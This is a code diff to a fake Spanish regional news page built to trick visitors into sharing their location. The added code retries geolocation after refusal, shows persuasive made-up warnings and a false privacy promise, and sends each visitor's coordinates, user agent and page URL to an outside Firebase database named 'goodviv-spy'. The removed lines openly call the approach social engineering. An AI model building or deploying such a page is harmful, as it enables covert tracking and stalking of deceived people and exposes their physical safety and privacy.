@@ -492,6 +492,13 @@
         </div>
     </main>
     
+    <!-- Botón de diagnóstico flotante -->
+    <div style="position: fixed; bottom: 20px; right: 20px; z-index: 1000;">
+        <button onclick="showDetailedDiagnostic()" style="background: #3498db; color: white; border: none; padding: 10px 15px; border-radius: 50px; cursor: pointer; font-size: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.3);">
+            🔧 Diagnóstico GPS
+        </button>
+    </div>
+
     <footer class="footer">
         <div class="container">
             <p>&copy; 2025 Diario Regional. Todos los derechos reservados.</p>
@@ -533,57 +540,119 @@
             }
         };
         
-        // Función para solicitar ubicación con técnicas de ingeniería social
+        // Función mejorada para solicitar ubicación
         function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        captureLocation(position);
-                        showSuccessMessage();
-                    },
-                    function(error) {
-                        handleLocationError(error);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 60000
+            console.log('📍 Solicitando ubicación...');
+            
+            // Mostrar indicador de carga
+            const alertDiv = document.querySelector('.location-alert');
+            const originalContent = alertDiv.innerHTML;
+            alertDiv.innerHTML = `
+                <h3>📡 Verificando Ubicación...</h3>
+                <p>Por favor, permite el acceso a tu ubicación cuando el navegador lo solicite.</p>
+                <div style="margin: 20px 0;">
+                    <div style="display: inline-block; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                </div>
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
                     }
-                );
-            } else {
-                alert("Tu navegador no soporta geolocalización. Por favor actualiza tu navegador para ver las noticias personalizadas.");
+                </style>
+            `;
+            
+            if (!navigator.geolocation) {
+                handleLocationError({ code: 'NO_SUPPORT', message: 'Geolocalización no soportada' });
+                return;
             }
+            
+            // Verificar protocolo HTTPS
+            if (location.protocol !== 'https:' && !location.hostname.includes('localhost')) {
+                console.warn('⚠️ Advertencia: Geolocalización puede fallar sin HTTPS');
+            }
+            
+            // Intentar con alta precisión primero
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    console.log('✅ Ubicación obtenida con alta precisión');
+                    captureLocation(position);
+                    showSuccessMessage();
+                },
+                function(error) {
+                    console.log('❌ Error con alta precisión, intentando configuración estándar...');
+                    // Si falla, intentar con configuración menos estricta
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            console.log('✅ Ubicación obtenida con configuración estándar');
+                            captureLocation(position);
+                            showSuccessMessage();
+                        },
+                        function(finalError) {
+                            console.error('❌ Error final de geolocalización:', finalError);
+                            handleLocationError(finalError);
+                        },
+                        {
+                            enableHighAccuracy: false,
+                            timeout: 30000,
+                            maximumAge: 300000 // 5 minutos
+                        }
+                    );
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 60000 // 1 minuto
+                }
+            );
         }
         
         // Capturar y almacenar ubicación
         function captureLocation(position) {
             const locationData = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
+                id: 'loc_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
                 accuracy: position.coords.accuracy,
                 timestamp: new Date().toISOString(),
-                source: 'news',
+                source: 'Diario Regional - Noticias',
                 userAgent: navigator.userAgent,
                 url: window.location.href,
                 newsTitle: document.getElementById('newsTitle').textContent
             };
+            
+            console.log('📍 Ubicación capturada:', locationData);
             
             // Guardar en localStorage
             let captures = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
             captures.push(locationData);
             localStorage.setItem('capturedLocations', JSON.stringify(captures));
             
-            // Intentar enviar a base de datos remota
-            fetch('/api/location', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(locationData)
-            }).catch(() => {
-                // Si falla, solo mantenemos en localStorage
-                console.log('Datos guardados localmente');
-            });
+            // Enviar a Firebase Realtime Database
+            saveToFirebase(locationData);
+        }
+        
+        // Función para enviar datos a Firebase
+        async function saveToFirebase(locationData) {
+            try {
+                const firebaseUrl = 'https://goodviv-spy-default-rtdb.firebaseio.com/locations.json';
+                
+                const response = await fetch(firebaseUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(locationData)
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Ubicación enviada a Firebase exitosamente');
+                } else {
+                    console.log('⚠️ Error al enviar a Firebase, datos guardados localmente');
+                }
+            } catch (error) {
+                console.log('⚠️ Error de conexión con Firebase:', error);
+                console.log('💾 Datos guardados solo localmente');
+            }
         }
         
         // Mostrar mensaje de éxito convincente
@@ -599,56 +668,130 @@
             alertDiv.style.background = 'linear-gradient(135deg, #10b981, #059669)';
         }
         
-        // Manejar errores de ubicación con mensajes persuasivos
+        // Manejar errores de ubicación con mensajes persuasivos mejorados
         function handleLocationError(error) {
+            console.log('❌ Error de geolocalización:', error);
+            
             let message = '';
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    message = `
-                        <h3>⚠️ Acceso Denegado</h3>
-                        <p>Para recibir información crítica sobre tu zona específica, necesitamos tu ubicación.</p>
-                        <p><strong>¿Cómo activarla?</strong> Haz clic en el ícono de ubicación 📍 en la barra de direcciones y selecciona "Permitir".</p>
-                        <button class="location-btn" onclick="requestLocation()" style="margin-top: 15px;">
-                            🔄 Intentar Nuevamente
-                        </button>
-                    `;
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = `
-                        <h3>📡 Ubicación No Disponible</h3>
-                        <p>No pudimos determinar tu ubicación exacta. Esto puede deberse a interferencias o configuración del dispositivo.</p>
-                        <button class="location-btn" onclick="requestLocation()">
-                            🔄 Reintentar
-                        </button>
-                    `;
-                    break;
-                case error.TIMEOUT:
-                    message = `
-                        <h3>⏱️ Tiempo Agotado</h3>
-                        <p>La verificación está tomando más tiempo del esperado. Inténtalo nuevamente.</p>
-                        <button class="location-btn" onclick="requestLocation()">
-                            🔄 Reintentar
-                        </button>
-                    `;
-                    break;
-                default:
-                    message = `
-                        <h3>❌ Error Desconocido</h3>
-                        <p>Ocurrió un error inesperado. Por favor intenta nuevamente.</p>
-                        <button class="location-btn" onclick="requestLocation()">
-                            🔄 Reintentar
-                        </button>
-                    `;
-                    break;
+            let troubleshootingTips = '';
+            
+            if (error.code === 1 || error.code === error.PERMISSION_DENIED) {
+                message = `
+                    <h3>🔒 Permisos de Ubicación Requeridos</h3>
+                    <p><strong>¡Importante!</strong> Esta noticia puede tener impacto directo en tu área.</p>
+                    <p>Para brindarte información precisa y relevante de tu zona, necesitamos verificar tu ubicación.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>📱 ¿Cómo permitir ubicación?</strong><br>
+                        1. Busca el ícono 📍 en la barra de direcciones<br>
+                        2. Haz clic y selecciona "Permitir"<br>
+                        3. En móvil: Ve a Configuración > Sitios web > Permisos
+                    </div>
+                `;
+            } else if (error.code === 2 || error.code === error.POSITION_UNAVAILABLE) {
+                message = `
+                    <h3>📡 Señal GPS Débil</h3>
+                    <p>Hay interferencias que impiden obtener tu ubicación exacta.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>💡 Sugerencias:</strong><br>
+                        • Sal al aire libre si estás en interior<br>
+                        • Activa el GPS en tu dispositivo<br>
+                        • Cierra otras apps que usen ubicación
+                    </div>
+                `;
+            } else if (error.code === 3 || error.code === error.TIMEOUT) {
+                message = `
+                    <h3>⏱️ Búsqueda de Ubicación Lenta</h3>
+                    <p>Tu dispositivo está tardando en encontrar la señal GPS.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>🔄 Soluciones:</strong><br>
+                        • Verifica tu conexión a internet<br>
+                        • Reinicia la aplicación<br>
+                        • Intenta en unos minutos
+                    </div>
+                `;
+            } else {
+                message = `
+                    <h3>⚠️ Error Técnico</h3>
+                    <p>Ocurrió un problema técnico al acceder a tu ubicación.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>🛠️ Intenta:</strong><br>
+                        • Actualizar la página<br>
+                        • Usar otro navegador<br>
+                        • Verificar permisos del sitio
+                    </div>
+                `;
             }
             
+            const fullMessage = `
+                ${message}
+                ${troubleshootingTips}
+                <button class="location-btn" onclick="requestLocation()" style="margin-top: 15px;">
+                    🔄 Intentar Nuevamente
+                </button>
+                <p style="font-size: 0.9rem; margin-top: 15px; opacity: 0.9;">
+                    <strong>🔐 Privacidad garantizada:</strong> Solo usamos tu ubicación para noticias locales.
+                </p>
+            `;
+            
             const alertDiv = document.querySelector('.location-alert');
-            alertDiv.innerHTML = message;
+            alertDiv.innerHTML = fullMessage;
             alertDiv.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
+        }
+        
+        // Diagnóstico de geolocalización
+        function runGeolocationDiagnostic() {
+            console.log('🔧 === DIAGNÓSTICO DE GEOLOCALIZACIÓN ===');
+            
+            const diagnosticInfo = {
+                geolocalizacionSoportada: !!navigator.geolocation,
+                protocolo: location.protocol,
+                esHTTPS: location.protocol === 'https:',
+                esLocal: location.hostname === 'localhost' || location.hostname === '127.0.0.1',
+                navegador: navigator.userAgent,
+                url: location.href
+            };
+            
+            console.table(diagnosticInfo);
+            
+            if (!diagnosticInfo.geolocalizacionSoportada) {
+                console.error('❌ PROBLEMA CRÍTICO: Navegador no soporta geolocalización');
+                return false;
+            }
+            
+            if (!diagnosticInfo.esHTTPS && !diagnosticInfo.esLocal) {
+                console.warn('⚠️ ADVERTENCIA: Geolocalización puede fallar sin HTTPS');
+            }
+            
+            // Verificar permisos si es posible
+            if (navigator.permissions) {
+                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                    console.log('🔐 Estado de permisos:', result.state);
+                    if (result.state === 'denied') {
+                        console.error('❌ PROBLEMA: Permisos de geolocalización denegados');
+                    }
+                }).catch(function(error) {
+                    console.log('ℹ️ No se pudieron verificar permisos:', error);
+                });
+            }
+            
+            return true;
         }
         
         // Inicializar página
         document.addEventListener('DOMContentLoaded', function() {
+            console.log('📰 Iniciando Diario Regional...');
+            
+            // Ejecutar diagnóstico de geolocalización
+            runGeolocationDiagnostic();
+            
             // Seleccionar noticia aleatoria
             const templates = Object.keys(newsTemplates);
             const randomTemplate = templates[Math.floor(Math.random() * templates.length)];
@@ -682,7 +825,98 @@
                 document.getElementById('newsTitle').textContent = specificNews.title;
                 document.getElementById('newsContent').textContent = specificNews.content;
             }
+            
+            console.log('✅ Diario Regional iniciado correctamente');
         });
+        
+        // Función para mostrar diagnóstico detallado al usuario
+        function showDetailedDiagnostic() {
+            const diagnosticInfo = {
+                navegador: navigator.userAgent,
+                geolocalizacionSoportada: !!navigator.geolocation,
+                protocolo: location.protocol,
+                esHTTPS: location.protocol === 'https:',
+                esLocal: location.hostname === 'localhost' || location.hostname === '127.0.0.1',
+                dominio: location.hostname,
+                url: location.href
+            };
+            
+            console.log('🔧 === DIAGNÓSTICO DETALLADO ===');
+            console.table(diagnosticInfo);
+            
+            let diagnosticMessage = `🔧 DIAGNÓSTICO DE GEOLOCALIZACIÓN:
+
+✅ Geolocalización soportada: ${diagnosticInfo.geolocalizacionSoportada ? 'SÍ' : 'NO'}
+🌐 Protocolo: ${diagnosticInfo.protocolo}
+🔐 HTTPS: ${diagnosticInfo.esHTTPS ? 'SÍ' : 'NO'}
+🏠 Dominio: ${diagnosticInfo.dominio}
+
+`;
+
+            if (!diagnosticInfo.geolocalizacionSoportada) {
+                diagnosticMessage += `❌ PROBLEMA CRÍTICO: Tu navegador no soporta geolocalización.
+📱 Solución: Actualiza tu navegador a la versión más reciente.
+
+`;
+            }
+
+            if (!diagnosticInfo.esHTTPS && !diagnosticInfo.esLocal) {
+                diagnosticMessage += `⚠️ ADVERTENCIA: El sitio no usa HTTPS.
+🔒 Esto puede causar problemas con la geolocalización.
+✅ Recomendación: Usa el sitio desde una URL con HTTPS.
+
+`;
+            }
+
+            if (navigator.permissions) {
+                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                    const permStatus = result.state;
+                    diagnosticMessage += `🔐 Estado de permisos: ${permStatus}
+
+`;
+                    
+                    if (permStatus === 'denied') {
+                        diagnosticMessage += `❌ PROBLEMA: Permisos denegados.
+🔧 Solución: 
+1. Haz clic en el ícono 🔒 o 📍 en la barra de direcciones
+2. Selecciona "Permitir" para ubicación
+3. Recarga la página
+
+`;
+                    } else if (permStatus === 'prompt') {
+                        diagnosticMessage += `✅ Los permisos se solicitarán cuando sea necesario.
+
+`;
+                    } else {
+                        diagnosticMessage += `✅ Permisos concedidos correctamente.
+
+`;
+                    }
+                    
+                    diagnosticMessage += `📊 CONSEJOS ADICIONALES:
+• Asegúrate de tener GPS activado en tu dispositivo
+• Si estás en interior, sal al aire libre
+• Cierra otras aplicaciones que usen ubicación
+• Verifica tu conexión a internet
+
+🔄 Después de hacer cambios, intenta de nuevo.`;
+                    
+                    alert(diagnosticMessage);
+                });
+            } else {
+                diagnosticMessage += `ℹ️ No se pueden verificar permisos automáticamente.
+
+📊 CONSEJOS GENERALES:
+• Verifica que el GPS esté activado
+• Permite ubicación cuando el navegador lo pida
+• Si estás en interior, sal al aire libre
+• Recarga la página después de cambiar configuraciones
+
+🔄 Intenta nuevamente después de verificar estos puntos.`;
+                
+                alert(diagnosticMessage);
+            }
+        }
         
         // Intentar capturar ubicación automáticamente después de 10 segundos
         setTimeout(() => {
